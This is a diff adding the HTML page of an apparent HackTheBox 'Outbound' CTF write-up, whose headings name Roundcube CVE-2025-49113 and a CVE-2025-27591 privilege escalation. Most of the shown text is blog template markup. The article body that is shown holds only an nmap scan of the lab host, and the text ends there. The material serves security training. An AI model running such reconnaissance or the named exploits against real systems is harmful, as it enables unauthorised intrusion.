@@ -1,0 +1,1767 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>Hackthebox - Outbound &middot; Re-toor</title>
+    <meta name="title" content="Hackthebox - Outbound &middot; Re-toor">
+  
+
+  
+  
+  
+    <meta name="keywords" content="Roundcube Webmail,CVE-2025-49113,msfconsole,ssh,CVE-2025-27591,linux,hackthebox,">
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/ctf/hackthebox/outbound/">
+  
+
+  
+  
+    <meta name="author" content="TAH">
+  
+  
+    
+      
+        
+          <link href="https://github.com/re-toor" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://www.linkedin.com/in/ha-tuan-anh" rel="me">
+        
+      
+    
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/ctf/hackthebox/outbound/">
+  <meta property="og:site_name" content="Re-toor">
+  <meta property="og:title" content="Hackthebox - Outbound">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="ctf">
+    <meta property="article:published_time" content="2025-07-27T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-07-27T00:00:00+00:00">
+    <meta property="article:tag" content="Roundcube Webmail">
+    <meta property="article:tag" content="CVE-2025-49113">
+    <meta property="article:tag" content="Msfconsole">
+    <meta property="article:tag" content="Ssh">
+    <meta property="article:tag" content="CVE-2025-27591">
+    <meta property="article:tag" content="Linux">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthebox - Outbound">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+  
+    
+  
+
+  
+  
+    <meta name="google-site-verification" content="1SrZKSHd82TJBbAQUQHiETfCL9gFqP0JneGjCV7VgHk">
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.dee52a50de99867dcf702b61813409684375e1531029925e3bf93a18ce5e9b90966dda9f19fd79daeca29df901c7b5408766f123540a0db92714d31fe7c3bdb1.css"
+    integrity="sha512-3uUqUN6Zhn3PcCthgTQJaEN14VMQKZJeO/k6GM5em5CWbdqfGf152uyinfkBx7VAh2bxI1QKDbknFNMf58O9sQ==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
+  
+  
+  
+  
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+    
+  
+  
+    
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.bdda7dece6cbaf08deef7d254f7f842f3261c2524d247905127c9a20decc03f1011a2950048464c79272c1ce0705a49a41147f39f2b95163bb71d404b33263ef.js"
+      integrity="sha512-vdp97ObLrwje730lT3&#43;ELzJhwlJNJHkFEnyaIN7MA/EBGilQBIRkx5Jywc4HBaSaQRR/OfK5UWO7cdQEszJj7w=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Ctf",
+    "name": "Hackthebox - Outbound",
+    "headline": "Hackthebox - Outbound",
+    
+    "inLanguage": "en",
+    "url" : "http://localhost:1313/ctf/hackthebox/outbound/",
+    "author" : {
+      "@type": "Person",
+      "name": "TAH"
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-07-27T00:00:00\u002b00:00",
+    "datePublished": "2025-07-27T00:00:00\u002b00:00",
+    
+    "dateModified": "2025-07-27T00:00:00\u002b00:00",
+    
+    "keywords": ["Roundcube Webmail","CVE-2025-49113","msfconsole","ssh","CVE-2025-27591","linux","hackthebox"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "2645"
+  },
+  {
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [{
+            "@type": "ListItem",
+            "position":  1 ,
+            "name": "HackTheBox",
+            "item": "http://localhost:1313/ctf/hackthebox/"
+          },{
+            "@type": "ListItem",
+            "position":  2 ,
+            "name": "Ctf",
+            "item": "http://localhost:1313/ctf/"
+          },{
+        "@type": "ListItem",
+        "position":  3 ,
+        "name": "Hackthebox - Outbound",
+        "item": "http://localhost:1313/ctf/hackthebox/outbound/"
+      }
+    ]
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
+      Re-toor
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
+    
+      
+  
+    <a
+      href="/blog/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="Blog"
+      title="Blog">
+      
+      
+        <span class="text-base font-medium break-normal">
+          Blog
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <a
+      href="/soc/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="SOC"
+      title="SOC">
+      
+      
+        <span class="text-base font-medium break-normal">
+          SOC
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <div class="nested-menu">
+      <div class="cursor-pointer flex items-center">
+        <a
+          
+            href="/ctf/"
+            
+          
+          aria-label="CTF"
+          class="flex items-center text-base font-medium bf-icon-color-hover"
+          title="Ctf">
+          
+          <span class="text-bg font-bg break-normal" title="Ctf">
+            CTF
+          </span>
+          <span>
+            <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+          </span>
+        </a>
+      </div>
+      <div class="menuhide">
+        <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl bg-neutral/25 dark:bg-neutral-800/25">
+          <div class="flex flex-col space-y-3">
+            
+              <a
+                href="/ctf/hackthebox/"
+                
+                aria-label="HackTheBox"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="HackTheBox">
+                  HackTheBox
+                </span>
+              </a>
+            
+              <a
+                href="/ctf/tryhackme/"
+                
+                aria-label="TryHackMe"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="TryHackMe">
+                  TryHackMe
+                </span>
+              </a>
+            
+              <a
+                href="/ctf/selfdev/"
+                
+                aria-label="Self-dev"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="Self-dev">
+                  Self-dev
+                </span>
+              </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+  
+
+    
+      
+  
+    <a
+      href="/about/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="About"
+      title="About">
+      
+      
+        <span class="text-base font-medium break-normal">
+          About
+        </span>
+      
+    </a>
+  
+
+    
+  
+
+  
+
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <div class="flex items-center">
+      <button
+        id="appearance-switcher"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base bf-icon-color-hover">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    </div>
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <button
+      id="appearance-switcher-mobile"
+      type="button"
+      aria-label="Dark mode switcher"
+      class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400">
+      <div class="dark:hidden">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+      </div>
+      <div class="hidden dark:block">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+      </div>
+    </button>
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      role="dialog"
+      aria-modal="true"
+      style="scrollbar-gutter: stable;"
+      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav class="mx-auto max-w-md space-y-6">
+        
+  
+    
+    <div class="px-2">
+      <a
+        href="/blog/"
+        aria-label="Blog"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="Blog" class="text-2xl font-bold tracking-tight">
+          Blog
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/soc/"
+        aria-label="SOC"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="SOC" class="text-2xl font-bold tracking-tight">
+          SOC
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/ctf/"
+        aria-label="CTF"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="Ctf" class="text-2xl font-bold tracking-tight">
+          CTF
+        </span>
+        
+          <label
+            for="fullscreen-submenu-ctf"
+            class="ms-auto flex items-center justify-center h-10 w-10 cursor-pointer rounded-lg bf-icon-color-hover border bf-border-color bf-border-color-hover">
+            <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+          </label>
+        
+      </a>
+
+      
+        <input checked type="checkbox" id="fullscreen-submenu-ctf" autocomplete="off" class="hidden peer/full">
+
+        <div
+          class="grid grid-rows-[0fr] transition-[grid-template-rows] duration-300 peer-checked/full:grid-rows-[1fr]">
+          <div class="overflow-hidden">
+            <div class="ms-7 mt-4">
+              
+                <a
+                  href="/ctf/hackthebox/"
+                  aria-label="HackTheBox"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="HackTheBox" class="text-lg">
+                    HackTheBox
+                  </span>
+                </a>
+              
+                <a
+                  href="/ctf/tryhackme/"
+                  aria-label="TryHackMe"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="TryHackMe" class="text-lg">
+                    TryHackMe
+                  </span>
+                </a>
+              
+                <a
+                  href="/ctf/selfdev/"
+                  aria-label="Self-dev"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="Self-dev" class="text-lg">
+                    Self-dev
+                  </span>
+                </a>
+              
+            </div>
+          </div>
+        </div>
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/about/"
+        aria-label="About"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="About" class="text-2xl font-bold tracking-tight">
+          About
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+
+      </nav>
+    </div>
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+
+
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Hackthebox - Outbound
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-07-27T00:00:00&#43;00:00">27 July 2025</time><span class="px-2 text-primary-500">&middot;</span><span>2645 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">13 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-10">
+            <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance-and-scanning">Reconnaissance and Scanning</a></li>
+    <li><a href="#enumeration-and-gaining-access">Enumeration and Gaining access</a>
+      <ul>
+        <li><a href="#vhost-directories">Vhost, directories</a></li>
+        <li><a href="#port-80">Port 80</a></li>
+        <li><a href="#cve-2025-49113">CVE-2025-49113</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege escalation</a>
+      <ul>
+        <li><a href="#cve-2025-27591">CVE-2025-27591</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance-and-scanning">Reconnaissance and Scanning</a></li>
+    <li><a href="#enumeration-and-gaining-access">Enumeration and Gaining access</a>
+      <ul>
+        <li><a href="#vhost-directories">Vhost, directories</a></li>
+        <li><a href="#port-80">Port 80</a></li>
+        <li><a href="#cve-2025-49113">CVE-2025-49113</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege escalation</a>
+      <ul>
+        <li><a href="#cve-2025-27591">CVE-2025-27591</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+<script>
+  (function () {
+    'use strict'
+
+    const SCROLL_OFFSET_RATIO = 0.33
+    const TOC_SELECTOR = '#TableOfContents'
+    const ANCHOR_SELECTOR = '.anchor'
+    const TOC_LINK_SELECTOR = 'a[href^="#"]'
+    const NESTED_LIST_SELECTOR = 'li ul'
+    const ACTIVE_CLASS = 'active'
+    let isJumpingToAnchor = false
+
+    function getActiveAnchorId(anchors, offsetRatio) {
+      const threshold = window.scrollY + window.innerHeight * offsetRatio
+      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
+      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))
+
+      if (isJumpingToAnchor) {
+        for (let i = 0; i < anchors.length; i++) {
+          const anchor = anchors[i]
+          if (!tocIds.has(anchor.id)) continue
+          const top = anchor.getBoundingClientRect().top + window.scrollY
+          if (Math.abs(window.scrollY - top) < 100) {
+            return anchor.id
+          }
+        }
+      }
+
+      for (let i = anchors.length - 1; i >= 0; i--) {
+        const top = anchors[i].getBoundingClientRect().top + window.scrollY
+        if (top <= threshold && tocIds.has(anchors[i].id)) {
+          return anchors[i].id
+        }
+      }
+      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
+    }
+
+    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
+      const activeId = getActiveAnchorId(anchors, scrollOffset)
+      if (!activeId) return
+
+      links.forEach(link => {
+        const isActive = link.getAttribute('href') === `#${activeId}`
+        link.classList.toggle(ACTIVE_CLASS, isActive)
+
+        if (collapseInactive) {
+          const ul = link.closest('li')?.querySelector('ul')
+          if (ul) ul.style.display = isActive ? '' : 'none'
+        }
+      })
+
+      if (collapseInactive) {
+        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
+        let el = activeLink
+        while (el && el !== toc) {
+          if (el.tagName === 'UL') el.style.display = ''
+          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
+          el = el.parentElement
+        }
+      }
+    }
+
+    function initTOC() {
+      const toc = document.querySelector(TOC_SELECTOR)
+      if (!toc) return
+
+      const collapseInactive = false
+      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
+      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]
+
+      if (collapseInactive) {
+        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
+      }
+
+      links.forEach(link => {
+        link.addEventListener('click', () => {
+          isJumpingToAnchor = true
+        })
+      })
+
+      const config = {
+        toc,
+        anchors,
+        links,
+        scrollOffset: SCROLL_OFFSET_RATIO,
+        collapseInactive
+      }
+
+      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
+      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })
+
+      updateTOC(config)
+    }
+
+    document.readyState === 'loading'
+      ? document.addEventListener('DOMContentLoaded', initTOC)
+      : initTOC()
+  })()
+</script>
+
+
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          <ol start="0">
+<li>this unordered seed list will be replaced by toc as unordered list
+{:toc}</li>
+</ol>
+
+<h2 class="relative group">Reconnaissance and Scanning
+    <div id="reconnaissance-and-scanning" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#reconnaissance-and-scanning" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT   STATE SERVICE REASON         VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span> nginx 1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://mail.outbound.htb/
